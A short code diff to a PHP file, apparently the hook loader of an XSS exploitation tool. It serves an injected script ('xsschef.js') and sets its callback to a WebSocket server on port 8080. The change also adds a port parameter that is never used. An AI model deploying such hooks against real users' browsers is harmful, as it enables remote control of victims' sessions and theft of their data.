@@ -17,7 +17,8 @@
     along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
 $script = file_get_contents('xsschef.js');
-$url = ($_SERVER['HTTPS'] ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . str_replace('/hook.php', '/server.php', $_SERVER['SCRIPT_NAME']);
+$port = !empty($_GET['port']) ? (int) $_GET['port'] : 8080;
+$url = ($_SERVER['HTTPS'] ? "wss://" : "ws://") . $_SERVER['HTTP_HOST'] . ':8080/chef'; 
 
 $ch = 'c'.crc32(rand() . time());
 $script = str_replace('__URL__', $url, $script);
